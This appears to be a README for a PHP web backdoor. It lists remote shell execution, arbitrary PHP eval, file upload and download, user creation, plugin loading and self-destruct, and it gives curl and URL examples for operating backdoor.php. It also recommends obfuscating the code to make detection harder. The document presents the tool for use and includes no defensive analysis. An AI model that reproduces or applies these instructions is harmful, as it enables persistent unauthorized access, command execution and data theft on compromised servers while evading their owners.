## **Backdoor Features**

### **1. Authentication and Security**
- **Session Management:** Uses sessions to track user state and login attempts.
- **IP Whitelisting:** Access is restricted to allowed IPs (e.g., `127.0.0.1` and `::1`).
- **Rate Limiting:** Limits the number of login attempts to prevent brute-force attacks; access is temporarily blocked if the limit is exceeded.
- **Token-Based Authentication:** Requires a unique token (stored in a file) to be sent via GET or POST requests for access.
- **Encryption:** Sensitive data (e.g., passwords) is encrypted using the AES-256-CBC algorithm.

### **2. Core Features**
- **Execute Shell Commands (`exec`):** Runs shell commands and displays their output.
- **Upload File (`upload`):** Allows uploading files to the server.
- **Download File (`download`):** Downloads files from the server.
- **List Directory Contents (`ls`):** Displays files and folders in a directory.
- **Read File (`read`):** Shows the contents of a file.
- **Write to File (`write`):** Writes or overwrites content in a file.

- **Execute PHP Code (`eval`):** Runs arbitrary PHP code.
- **Port Scanning (`scan`):** Checks if a specific port is open on a host.
- **List Processes (`ps`):** Displays a list of running processes.
- **Kill Process (`kill`):** Terminates a process using its PID.
- **Copy File (`copy`):** Copies a file from one path to another.
- **Move File (`move`):** Moves a file from one path to another.
- **Delete File (`delete`):** Deletes a file.
- **Rename File (`rename`):** Renames a file.
- **Create Directory (`mkdir`):** Creates a new directory.
- **Remove Directory (`rmdir`):** Deletes an empty directory.
- **Add User (`adduser`):** Adds a new user to the system (on Unix-like systems).

- **Start Service (`start_service`):** Starts a service.
- **Stop Service (`stop_service`):** Stops a service.
- **Restart Service (`restart_service`):** Restarts a service.
- **Ping (`ping`):** Pings a host.
- **Traceroute (`traceroute`):** Performs a traceroute for a host.
- **DNS Lookup (`dns_lookup`):** Performs a DNS lookup for a host.
- **CPU Information (`cpu_info`):** Displays CPU details.
- **Memory Information (`mem_info`):** Shows memory usage details.
- **Disk Usage (`disk_usage`):** Displays disk usage information.
- **Server Uptime (`uptime`):** Shows the server’s uptime.
- **Web Shell (`shell`):** Provides a simple interface for executing shell commands.
- **Self-Destruct (`self_destruct`):** Deletes the script and related files.
- **Load Plugin (`load_plugin`):** Loads and executes external plugins.

### **3. Logging and Auditing**

### **4. Error Handling**
- Errors are managed using a try-catch mechanism and recorded in a log file.

### **5. Stealth and Compatibility**
- **Code Obfuscation:** The code can be obfuscated to make detection more difficult.
- **HTTPS Support:** It’s recommended to use HTTPS for encrypted communication.

## **How to Use the Backdoor**

Follow these steps to use the backdoor:

### **1. Initial Setup**
- **File Paths:** Set secure paths for the token, log, and error files in the variables `$tokenFile`, `$logFile`, and `$errorLog`.
- **Encryption Key:** Change the value of `$encryptionKey` to a secure key.
- **Allowed IPs:** Add IPs permitted to access the backdoor to the `$allowedIPs` array.

### **2. Accessing the Backdoor**
- You need to read the token from the `$tokenFile` and include it in your GET or POST requests.
- **Example with GET (Execute Command):**
  ```
  http://yourserver.com/backdoor.php?token=your_token&action=exec&cmd=whoami
  ```
- **Example with POST (Execute Command):**
  ```bash
  curl -X POST -d "token=your_token&action=exec&cmd=whoami" http://yourserver.com/backdoor.php
  ```

### **3. Using Features**
Send the required parameters in your request to use each feature. Here are some examples:
- **Upload File:**
  ```bash
  curl -X POST -F "token=your_token" -F "action=upload" -F "file=@localfile.txt" -F "target=/path/to/dest.txt" http://yourserver.com/backdoor.php
  ```
- **Execute Database Query:**
  ```
  http://yourserver.com/backdoor.php?token=your_token&action=db&query=SELECT%20*%20FROM%20users
  ```
- **Ping a Host:**
  ```
  http://yourserver.com/backdoor.php?token=your_token&action=ping&host=google.com
  ```
- **Download File:**
  ```
  http://yourserver.com/backdoor.php?token=your_token&action=download&file=/path/to/file.txt
  ```

### **4. Using the Web Shell**
- To access the web shell interface:
  ```
  http://yourserver.com/backdoor.php?token=your_token&action=shell
  ```
- A simple form will appear where you can enter and execute shell commands.

### **5. Self-Destruct**
- To delete the backdoor and its related files:
  ```
  http://yourserver.com/backdoor.php?token=your_token&action=self_destruct
  ```
